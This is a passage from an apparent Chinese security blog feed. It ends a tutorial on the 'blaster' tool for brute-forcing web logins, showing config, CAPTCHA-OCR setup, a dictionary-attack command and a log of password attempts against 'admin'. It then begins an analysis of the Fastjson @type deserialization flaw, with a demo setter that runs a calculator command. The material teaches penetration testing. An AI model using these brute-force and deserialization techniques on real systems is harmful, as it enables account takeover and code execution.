图片验证码识别服务，使用captchabreak_serverurl文件夹中的脚本进行搭建</span></span><br><span class="line"><span class="attr">before_all_js_expr:</span> <span class="string">&#x27;&#x27;</span> <span class="comment"># 在开始填写账号密码之前执行的js表达式</span></span><br><span class="line"><span class="attr">userinput_jspath:</span> <span class="string">&#x27;document.querySelector(&quot;#loginid&quot;)&#x27;</span><span class="comment"># 用户名输入框js path</span></span><br><span class="line"><span class="attr">passinput_jspath:</span> <span class="string">&#x27;document.querySelector(&quot;#security_in&quot;)&#x27;</span><span class="comment"># 密码输入框js path</span></span><br><span class="line"><span class="attr">captchainput_jspath:</span> <span class="string">&#x27;document.querySelector(&quot;#jcaptcha&quot;)&#x27;</span><span class="comment"># 验证码输入框js path</span></span><br><span class="line"><span class="attr">captchaimg_jspath:</span> <span class="string">&#x27;document.querySelector(&quot;#vcode&quot;)&#x27;</span><span class="comment"># 验证码图片js path</span></span><br><span class="line"><span class="attr">before_login_js_expr:</span> <span class="string">&#x27;&#x27;</span> <span class="comment"># 在点击登录之前执行的js表达式</span></span><br><span class="line"><span class="attr">loginbutton_jspath:</span> <span class="string">&#x27;document.querySelector(&quot;#vcode&quot;)&#x27;</span></span><br><span class="line"><span class="attr">loginreq_pattern:</span> <span class="string">&#x27;*user/login*&#x27;</span> <span class="comment"># 登录请求的url特征码，实际登录数据包url path 里面的通配符*必不可少</span></span><br><span class="line"><span class="attr">body_exclude_regex:</span> <span class="comment"># 排除请求的正则，即只要命中其中任意一个正则的请求响应将被抛弃</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">&#x27;regex1&#x27;</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">&#x27;regex2&#x27;</span></span><br><span class="line"><span class="attr">maxbody_bytes_display:</span> <span class="number">512</span> <span class="comment"># 登录请求响应包最大限制，超过限制则不会显示</span></span><br><span class="line"><span class="attr">concurrency:</span> <span class="number">1</span> <span class="comment"># 并发数</span></span><br><span class="line"><span class="attr">timeout_ms:</span> <span class="number">50000</span> <span class="comment"># 浏览器中操作的超时时间(毫秒)</span></span><br><span class="line"><span class="attr">timeinterval_ms:</span> <span class="number">300</span> <span class="comment"># 浏览器中操作登录过程中每个操作之间的时间间隔(毫秒)</span></span><br><span class="line"><span class="attr">proxy:</span> <span class="string">&#x27;&#x27;</span> <span class="comment"># 代理</span></span><br></pre></td></tr></table></figure><ul><li><p>captchabreak_serverurl</p><ul><li>用于指定图片验证码服务，格式为 <a href="http://user:pass@127.0.0.1:port/cb">http://user:pass@127.0.0.1:port/cb</a></li></ul><p>before_all_js_expr</p><ul><li><p>在开始填写账号密码之前执行的js表达式，如页面打开后有弹出层，可以将通过该参数关闭弹窗，不局限于弹出层一个场景。</p></li><li><p>示例场景：打开页面出现弹出层，需要关闭弹窗后输入账号密码。</p></li><li><p>示例解决弹出层：判断某按钮（弹出层关闭按钮X）是否存在，如果存在则点击；找出关闭按钮的js path按照格式编写代码即可。</p></li><li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">null !&#x3D; jspath &amp;&amp; jspath.click()&#x2F;&#x2F; js代码格式</span><br></pre></td></tr></table></figure></li><li><p>表达式不限于一个，如有其他场景或多个弹出层，可通过 &amp;&amp; 或 || 进行叠加</p></li></ul><p>before_login_js_expr</p><ul><li><p>在点击登录之前执行的js表达式，如登录需要勾选阅读平台使用须知、 隐私政策单选表单等</p></li><li><p>示例场景：输入账号密码后需要选择阅读平台使用须知、 隐私政策等表单才可登录</p></li><li><p>示例解决表单勾选：判断某勾选框是否已经勾选如果未勾选则点击；找出表单勾选的js path按照格式编写代码即可。</p></li><li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!jspath.checked &amp;&amp; jspath.click() &#x2F;&#x2F; js代码格式</span><br></pre></td></tr></table></figure></li><li><p>表达式不限于一个，如有其他场景或多个勾选，可通过 &amp;&amp; 或 || 进行叠加</p></li></ul><p>body_exclude_regex</p><ul><li><p>排除请求的正则，即只要命中其中任意一个正则的请求响应将被抛弃，即反向grep。</p></li><li><p>示例场景：登录后的响应页面长度较大，返回格式为HTML，其中有（账号不存在、密码错误、验证码错误、登录成功）等不同情况，由于响应长度较大我们无法轻易区分测试数据的真实响应情况。</p></li><li><p>示例解决响应长度较大问题：经过手工登录测试发现响应的HTML中出现这些关键信息（如账号不存在、密码错误、验证码错误），根据自己的需求，编写正则表达式，在发现响应中存在这些匹配内容时不输出到终端及结果文件中。</p></li><li><p>这里需要具备一些正则表达式的技能，如果使用者技能有些欠缺，可以直接使用关键信息进行排除，或是在交流群内寻求帮助。</p></li><li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">body_exclude_regex:</span><br><span class="line">  - &#39;账号不存在&#39;</span><br><span class="line">  - &#39;验证码错误&#39;</span><br></pre></td></tr></table></figure></li><li><p>该参数不限于一个表达式，使用者根据自己的需求来增删表达式即可。</p></li></ul><p>客户端配置中的jspath可在浏览器页面对应表单右键选择检查(Inspect)，并在检查中右键选中的表单标签，选择Copy&gt;Copy JS path即可复制jspath。</p></li></ul><h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">balster</span>&gt;<span class="title">blaster_win.exe</span></span></span><br><span class="line"><span class="function"><span class="title">Usage</span> <span class="title">of</span> <span class="title">blaster_win.exe</span>:</span></span><br><span class="line"><span class="function">  -<span class="title">c</span> <span class="title">string</span></span></span><br><span class="line"><span class="function">        <span class="title">config</span> <span class="title">file</span># 指定<span class="title">config.yaml</span></span></span><br><span class="line"><span class="function">  -<span class="title">o</span> <span class="title">string</span></span></span><br><span class="line"><span class="function">        <span class="title">output</span> <span class="title">file</span> <span class="title">path</span> (<span class="title">optional</span>)# 暴力破解测试数据输出文件位置</span></span><br><span class="line"><span class="function">  -<span class="title">p</span> <span class="title">string</span></span></span><br><span class="line"><span class="function">        <span class="title">pass</span> <span class="title">dict</span> <span class="title">file</span> <span class="title">path</span># 指定密码字典</span></span><br><span class="line"><span class="function">  -<span class="title">u</span> <span class="title">string</span></span></span><br><span class="line"><span class="function">        <span class="title">user</span> <span class="title">dict</span> <span class="title">file</span> <span class="title">path</span># 指定用户名字典</span></span><br></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">blaster</span>&gt;<span class="title">blaster_win.exe</span> -<span class="title">c</span> <span class="title">conf.yaml</span> -<span class="title">u</span> <span class="title">user.txt</span> -<span class="title">p</span> <span class="title">pwds.txt</span> -<span class="title">o</span> <span class="title">res.csv</span></span></span><br><span class="line"><span class="function">2022/01/28 19:09:08 200 <span class="title">OPTIONS</span> <span class="title">admin</span>   <span class="title">admin</span>   0</span></span><br><span class="line"><span class="function">2022/01/28 19:09:08 200 <span class="title">POST</span>    <span class="title">admin</span>   <span class="title">admin</span>   86      &#123;&quot;<span class="title">result</span>&quot;:-1,&quot;<span class="title">errorCode</span>&quot;:&quot;10005&quot;,&quot;<span class="title">title</span>&quot;:&quot;<span class="title">fail</span>&quot;,&quot;<span class="title">description</span>&quot;:&quot;10005&quot;,&quot;<span class="title">retValue</span>&quot;:<span class="title">null</span>&#125;</span></span><br><span class="line"><span class="function">2022/01/28 19:09:10 200 <span class="title">POST</span>    <span class="title">admin</span>   <span class="title">admin123</span>        135     &#123;&quot;<span class="title">result</span>&quot;:-1,&quot;<span class="title">errorCode</span>&quot;:&quot;10011&quot;,&quot;<span class="title">title</span>&quot;:&quot;<span class="title">fail</span>&quot;,&quot;<span class="title">description</span>&quot;:&quot;密码过于简单，请使用手机号验证码登录&quot;,&quot;<span class="title">retValue</span>&quot;:<span class="title">null</span>&#125;</span></span><br><span class="line"><span class="function">2022/01/28 19:09:13 200 <span class="title">POST</span>    <span class="title">admin</span>   123456  135     &#123;&quot;<span class="title">result</span>&quot;:-1,&quot;<span class="title">errorCode</span>&quot;:&quot;10011&quot;,&quot;<span class="title">title</span>&quot;:&quot;<span class="title">fail</span>&quot;,&quot;<span class="title">description</span>&quot;:&quot;密码过于简单，请使用手机号验证码登录&quot;,&quot;<span class="title">retValue</span>&quot;:<span class="title">null</span>&#125;</span></span><br><span class="line"><span class="function">2022/01/28 19:09:16 200 <span class="title">POST</span>    <span class="title">admin</span>   1234567 135     &#123;&quot;<span class="title">result</span>&quot;:-1,&quot;<span class="title">errorCode</span>&quot;:&quot;10011&quot;,&quot;<span class="title">title</span>&quot;:&quot;<span class="title">fail</span>&quot;,&quot;<span class="title">description</span>&quot;:&quot;密码过于简单，请使用手机号验证码登录&quot;,&quot;<span class="title">retValue</span>&quot;:<span class="title">null</span>&#125;</span></span><br><span class="line"><span class="function">2022/01/28 19:09:18 200 <span class="title">POST</span>    <span class="title">admin</span>   12345678        135     &#123;&quot;<span class="title">result</span>&quot;:-1,&quot;<span class="title">errorCode</span>&quot;:&quot;10011&quot;,&quot;<span class="title">title</span>&quot;:&quot;<span class="title">fail</span>&quot;,&quot;<span class="title">description</span>&quot;:&quot;密码过于简单，请使用手机号验证码登录&quot;,&quot;<span class="title">retValue</span>&quot;:<span class="title">null</span>&#125;</span></span><br><span class="line"><span class="function">2022/01/28 19:09:21 200 <span class="title">POST</span>    <span class="title">admin</span>   <span class="title">password</span>        86      &#123;&quot;<span class="title">result</span>&quot;:-1,&quot;<span class="title">errorCode</span>&quot;:&quot;10005&quot;,&quot;<span class="title">title</span>&quot;:&quot;<span class="title">fail</span>&quot;,&quot;<span class="title">description</span>&quot;:&quot;10005&quot;,&quot;<span class="title">retValue</span>&quot;:<span class="title">null</span>&#125;</span></span><br><span class="line"><span class="function">2022/01/28 19:09:24 200 <span class="title">POST</span>    <span class="title">admin</span>   <span class="title">Aa123456</span>.       86      &#123;&quot;<span class="title">result</span>&quot;:-1,&quot;<span class="title">errorCode</span>&quot;:&quot;10001&quot;,&quot;<span class="title">title</span>&quot;:&quot;<span class="title">fail</span>&quot;,&quot;<span class="title">description</span>&quot;:&quot;10001&quot;,&quot;<span class="title">retValue</span>&quot;:<span class="title">null</span>&#125;</span></span><br><span class="line"><span class="function">2022/01/28 19:09:26 200 <span class="title">POST</span>    <span class="title">admin</span>   <span class="title">p</span>@$$<span class="title">w0rd</span>        86      &#123;&quot;<span class="title">result</span>&quot;:-1,&quot;<span class="title">errorCode</span>&quot;:&quot;10005&quot;,&quot;<span class="title">title</span>&quot;:&quot;<span class="title">fail</span>&quot;,&quot;<span class="title">description</span>&quot;:&quot;10005&quot;,&quot;<span class="title">retValue</span>&quot;:<span class="title">null</span>&#125;</span></span><br><span class="line"><span class="function">2022/01/28 19:09:29 200 <span class="title">POST</span>    <span class="title">admin</span>   1<span class="title">q2W</span>#<span class="title">e4r</span>        86      &#123;&quot;<span class="title">result</span>&quot;:-1,&quot;<span class="title">errorCode</span>&quot;:&quot;10001&quot;,&quot;<span class="title">title</span>&quot;:&quot;<span class="title">fail</span>&quot;,&quot;<span class="title">description</span>&quot;:&quot;10001&quot;,&quot;<span class="title">retValue</span>&quot;:<span class="title">null</span>&#125;</span></span><br><span class="line"><span class="function">2022/01/28 19:09:32 200 <span class="title">POST</span>    <span class="title">admin</span>   <span class="title">P</span>@$$<span class="title">w0rd</span>        126     &#123;&quot;<span class="title">result</span>&quot;:-1,&quot;<span class="title">errorCode</span>&quot;:&quot;10008&quot;,&quot;<span class="title">title</span>&quot;:&quot;<span class="title">fail</span>&quot;,&quot;<span class="title">description</span>&quot;:&quot;密码错误次数已满，请明天再登录&quot;,&quot;<span class="title">retValue</span>&quot;:<span class="title">null</span>&#125;</span></span><br><span class="line"><span class="function">2022/01/28 19:09:34 200 <span class="title">POST</span>    <span class="title">admin</span>   <span class="title">password123</span>     126     </span></span><br></pre></td></tr></table></figure><p>使用操作实例</p><p>1、验证码服务启动（没验证码就不用，且注释配置文件关于验证码选项）</p><p><img src="/images/image-20220420101316059.png" alt="image-20220420101316059"></p><p>2、配置config.yaml</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 示例目标网址：http://www.example.com/login</span></span><br><span class="line"><span class="comment"># 示例登录目标最终发送的请求数据包地址：http://www.example.com/api/user/login</span></span><br><span class="line"><span class="comment"># 示例图片验证码识别服务：python3 cbhs.py -a admin:123 -p 8999</span></span><br><span class="line"></span><br><span class="line"><span class="attr">target_url:</span> <span class="string">&#x27;http://xx:9090/login/index.jsp&#x27;</span> <span class="comment"># 登录目标网址</span></span><br><span class="line"><span class="attr">browser_path:</span> <span class="string">&#x27;C:\Program Files\Google\Chrome\Application\chrome.exe&#x27;</span> <span class="comment"># 浏览器的路径</span></span><br><span class="line"><span class="attr">headless:</span> <span class="literal">false</span> <span class="comment"># 设置false显式运行浏览器 true则反之</span></span><br><span class="line"><span class="attr">captchabreak_serverurl:</span> <span class="string">&#x27;http://admin:123@127.0.0.1:8999/cb&#x27;</span> <span class="comment"># 图片验证码识别服务，使用captchabreak_serverurl文件夹中的脚本进行搭建</span></span><br><span class="line"><span class="attr">before_all_js_expr:</span> <span class="string">&#x27;document.getElementById(&quot;userN&quot;).value=&quot;&quot;&#x27;</span> <span class="comment"># 在开始填写账号密码之前执行的js表达式</span></span><br><span class="line"><span class="attr">userinput_jspath:</span> <span class="string">&#x27;document.querySelector(&quot;#userN&quot;)&#x27;</span>  <span class="comment"># 用户名输入框js path</span></span><br><span class="line"><span class="attr">passinput_jspath:</span> <span class="string">&#x27;document.querySelector(&quot;#passWs&quot;)&#x27;</span>  <span class="comment"># 密码输入框js path</span></span><br><span class="line"><span class="attr">captchainput_jspath:</span> <span class="string">&#x27;document.querySelector(&quot;#validCode&quot;)&#x27;</span>  <span class="comment"># 验证码输入框js path</span></span><br><span class="line"><span class="attr">captchaimg_jspath:</span> <span class="string">&#x27;document.querySelector(&quot;#kaptchaImage&quot;)&#x27;</span> <span class="comment"># 验证码图片js path</span></span><br><span class="line"><span class="attr">before_login_js_expr:</span> <span class="string">&#x27;&#x27;</span> <span class="comment"># 在点击登录之前执行的js表达式</span></span><br><span class="line"><span class="attr">loginbutton_jspath:</span> <span class="string">&#x27;document.querySelector(&quot;#a_login&quot;)&#x27;</span></span><br><span class="line"><span class="attr">loginreq_pattern:</span> <span class="string">&#x27;*/login/login_valid.jsp*&#x27;</span> <span class="comment"># 登录请求的url特征码，实际登录数据包url path</span></span><br><span class="line"><span class="attr">body_exclude_regex:</span> <span class="comment"># 排除请求的正则，即只要命中其中任意一个正则的请求响应将被抛弃</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">&#x27;regex1&#x27;</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">&#x27;regex2&#x27;</span></span><br><span class="line"><span class="attr">maxbody_bytes_display:</span> <span class="number">512</span> <span class="comment"># 登录请求响应包最大限制，超过限制则不会显示</span></span><br><span class="line"><span class="attr">concurrency:</span> <span class="number">2</span> <span class="comment"># 并发数</span></span><br><span class="line"><span class="attr">timeout_ms:</span> <span class="number">50000</span> <span class="comment"># 浏览器中操作的超时时间(毫秒)</span></span><br><span class="line"><span class="attr">timeinterval_ms:</span> <span class="number">600</span> <span class="comment"># 浏览器中操作登录过程中每个操作之间的时间间隔(毫秒)</span></span><br><span class="line"><span class="attr">proxy:</span> <span class="string">&#x27;&#x27;</span> <span class="comment"># 代理</span></span><br></pre></td></tr></table></figure><p>注：里面的loginreq_pattern通配符*必不可少</p><p>3、运行</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">blaster_win.exe -c conf.yaml -u user.txt -p pass.txt -o re.csv</span><br></pre></td></tr></table></figure><p><img src="/images/image-20220420101547279.png" alt="image-20220420101547279"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://github.com/c0ny1/captcha-killer">https://github.com/c0ny1/captcha-killer</a></p><p><a href="https://github.com/f0ng/captcha-killer-modified">https://github.com/f0ng/captcha-killer-modified</a></p><p><a href="https://gv7.me/articles/2019/burp-captcha-killer-usage/">https://gv7.me/articles/2019/burp-captcha-killer-usage/</a></p><p><a href="https://github.com/sml2h3/ddddocr">https://github.com/sml2h3/ddddocr</a></p><p><a href="https://github.com/sml2h3/ocr_api_server">https://github.com/sml2h3/ocr_api_server</a></p><p><a href="https://github.com/PoJun-Lab/blaster">https://github.com/PoJun-Lab/blaster</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 暴力破解 </tag>
            
            <tag> 验证码识别 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>fastjosn漏洞原理分析</title>
      <link href="2022/02/15/fastjosn%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/"/>
      <url>2022/02/15/fastjosn%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="fastjosn漏洞原理分析"><a href="#fastjosn漏洞原理分析" class="headerlink" title="fastjosn漏洞原理分析"></a>fastjosn漏洞原理分析</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Fastjson 是一个 Java 库，可以将 Java 对象转换为 JSON 格式，当然它也可以将 JSON 字符串转换为 Java 对象。<br>Fastjson 可以操作任何 Java 对象，即使是一些预先存在的没有源码的对象。<br>Fastjson 源码地址：<a href="https://github.com/alibaba/fastjson">https://github.com/alibaba/fastjson</a><br>Fastjson 中文 Wiki：<a href="https://github.com/alibaba/fastjson/wiki/Quick-Start-CN">https://github.com/alibaba/fastjson/wiki/Quick-Start-CN</a><br>Jar下载：<a href="https://mvnrepository.com/artifact/com.alibaba/fastjson/1.2.24">https://mvnrepository.com/artifact/com.alibaba/fastjson/1.2.24</a></p><h2 id="fastjson序列化与反序列化"><a href="#fastjson序列化与反序列化" class="headerlink" title="fastjson序列化与反序列化"></a>fastjson序列化与反序列化</h2><h3 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h3><p>Student.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;构造函数&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getName&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setName&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getAge&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setAge&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后通过Ser.java进行序列化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Ser</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        Student student = <span class="keyword">new</span> Student();</span><br><span class="line">        student.setName(<span class="string">&quot;AKA-whoami&quot;</span>);</span><br><span class="line">        student.setAge(<span class="number">30</span>);</span><br><span class="line">        String jsonstring = JSON.toJSONString(student, SerializerFeature.WriteClassName);</span><br><span class="line">        System.out.println(jsonstring);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>SerializerFeature.WriteClassName</code>是<code>toJSONString</code>设置的一个属性值，设置之后在序列化的时候会多写入一个<code>@type</code>，即写上被序列化的类名，<code>type</code>可以指定反序列化的类，并且调用其<code>getter/setter/is</code>方法。</p><p><img src="/images/image-20220214222832014.png" alt="image-20220214222832014"></p><p>不加<code>SerializerFeature.WriteClassName</code>时</p><p><img src="/images/image-20220214222856209.png" alt="image-20220214222856209"></p><h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p>Fastjson提供两个主要接口JSON.toJSONString和JSON.parseObject/JSON.parse来分别实现序列化和反序列化操作，而反序列化的两种方法parseObject和parse也有所不同</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> JSONObject <span class="title">parseObject</span><span class="params">(String text)</span> </span>&#123;</span><br><span class="line">        Object obj = parse(text);</span><br><span class="line">        <span class="keyword">return</span> obj <span class="keyword">instanceof</span> JSONObject ? (JSONObject)obj : (JSONObject)toJSON(obj);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>parseObject其实也是使用的parse方法，只是多了一步toJSON方法处理对象。</p><p>观察下面几种反序列化方法</p><p><img src="/images/image-20220214230241023.png" alt="image-20220214230241023"></p><p>一二种方法没有成功反序列化，因为没有确定到底属于哪个对象的，所以只能将其转换为一个普通的JSON对象而不能正确转换。所以这里就用到了<code>@type</code>，修改后代码如下</p><p><img src="/images/image-20220215084906751.png" alt="image-20220215084906751"></p><p>这样便能成功反序列化，可以看到parse成功触发了set方法，parseObject同时触发了set和get方法，因为这种<code>autoType</code>所以导致了fastjson反序列化漏洞</p><h2 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h2><p>上面了解了Fastjson的autoType，所以也就能想到反序列化漏洞产生的原因是get或set方法中存在恶意操作，以下面demo为例</p><p>Student.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> String sex;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;构造函数&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getName&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setName&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getAge&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setAge&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSex</span><span class="params">(String sex)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setSex&quot;</span>);</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;open -a Calculator&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Unser.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.company;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Unser</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        String jsonstring =<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.company.Student\&quot;:\&quot;age\&quot;:31,\&quot;name\&quot;:\&quot;AKA-whoami\&quot;,\&quot;sex\&quot;:\&quot;man\&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="comment">//System.out.println(JSON.parse(jsonstring));</span></span><br><span class="line">        System.out.println(JSON.parseObject(jsonstring));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/image-20220215085937659.png" alt="image-20220215085937659"></p><h2 id="反序列化流程分析"><a href="#反序列化流程分析" class="headerlink" title="反序列化流程分析"></a>反序列化流程分析</h2><p>在parseObject处下断点，跟进</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span 